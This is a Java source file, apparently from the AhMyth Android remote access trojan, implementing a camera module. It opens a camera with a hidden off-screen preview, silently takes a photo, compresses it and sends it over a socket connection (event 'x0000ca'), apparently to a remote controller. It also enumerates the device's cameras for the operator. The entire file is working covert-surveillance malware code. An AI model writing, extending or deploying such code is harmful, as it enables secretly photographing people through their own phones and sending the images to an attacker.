package ahmyth.mine.king.ahmyth;


import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.Parameters;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;


public class CameraManager {

    private static final String TAG = "CameraManager";
    private Context context;
    private Camera camera;
    private Handler mainHandler = new Handler(Looper.getMainLooper());


    public CameraManager(Context context) {
        this.context = context;
    }


    public void startUp(int cameraID) {
        Log.d(TAG, "startUp called with cameraID: " + cameraID);
        
        // Run camera operations on main thread
        mainHandler.post(() -> {
            try {
                Log.d(TAG, "Opening camera " + cameraID);
                camera = Camera.open(cameraID);
                
                if (camera == null) {
                    Log.e(TAG, "Failed to open camera " + cameraID);
                    sendError("Failed to open camera");
                    return;
                }
                
                Parameters parameters = camera.getParameters();
                
                // Set optimal picture size
                Camera.Size optimalSize = getOptimalPictureSize(parameters);
                if (optimalSize != null) {
                    parameters.setPictureSize(optimalSize.width, optimalSize.height);
                }
                
                camera.setParameters(parameters);
                
                try {
                    camera.setPreviewTexture(new SurfaceTexture(0));
                    camera.startPreview();
                    Log.d(TAG, "Preview started");
                } catch (Exception e) {
                    Log.e(TAG, "Error starting preview", e);
                }
                
                // Add a small delay before taking picture to allow auto-focus
                mainHandler.postDelayed(() -> {
                    try {
                        Log.d(TAG, "Taking picture...");
                        camera.takePicture(null, null, new PictureCallback() {
                            @Override
                            public void onPictureTaken(byte[] data, Camera camera) {
                                Log.d(TAG, "Picture taken, data length: " + (data != null ? data.length : 0));
                                releaseCamera();
                                if (data != null && data.length > 0) {
                                    sendPhoto(data);
                                } else {
                                    sendError("No image data received");
                                }
                            }
                        });
                    } catch (Exception e) {
                        Log.e(TAG, "Error taking picture", e);
                        releaseCamera();
                        sendError("Error taking picture: " + e.getMessage());
                    }
                }, 500); // 500ms delay for auto-focus
                
            } catch (Exception e) {
                Log.e(TAG, "Error in startUp", e);
                releaseCamera();
                sendError("Camera error: " + e.getMessage());
            }
        });
    }
    
    private Camera.Size getOptimalPictureSize(Parameters params) {
        java.util.List<Camera.Size> sizes = params.getSupportedPictureSizes();
        if (sizes == null || sizes.isEmpty()) return null;
        
        // Find a reasonable size (not too large to avoid memory issues)
        Camera.Size optimal = sizes.get(0);
        for (Camera.Size size : sizes) {
            if (size.width <= 1920 && size.height <= 1080) {
                if (size.width * size.height > optimal.width * optimal.height) {
                    optimal = size;
                }
            }
        }
        return optimal;
    }
    
    private void sendError(String message) {
        try {
            JSONObject object = new JSONObject();
            object.put("image", false);
            object.put("error", message);
            IOSocket.getInstance().getIoSocket().emit("x0000ca", object);
        } catch (Exception e) {
            Log.e(TAG, "Error sending error message", e);
        }
    }


    private void sendPhoto(byte [] data){

        try {

            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 20, bos);
            JSONObject object = new JSONObject();
            object.put("image",true);
            object.put("buffer" , bos.toByteArray());
            IOSocket.getInstance().getIoSocket().emit("x0000ca" , object);


        } catch (JSONException e) {
            e.printStackTrace();
        }

    }

    private void releaseCamera(){
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }

    public JSONObject findCameraList() {

        if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            return null;
        }





        try {
            JSONObject cameras = new JSONObject();
            JSONArray list = new JSONArray();
            cameras.put("camList",true);

            // Search for available cameras
            int numberOfCameras = Camera.getNumberOfCameras();
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Front");
                    jo.put("id", i);
                    list.put(jo);
                }
                else if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK){
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Back");
                    jo.put("id", i);
                    list.put(jo);
                }
                else {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Other");
                    jo.put("id", i);
                    list.put(jo);
                }
            }

            cameras.put("list" , list);
            return cameras;

        } catch (JSONException e) {
            e.printStackTrace();
        }

        return null;

    }





}
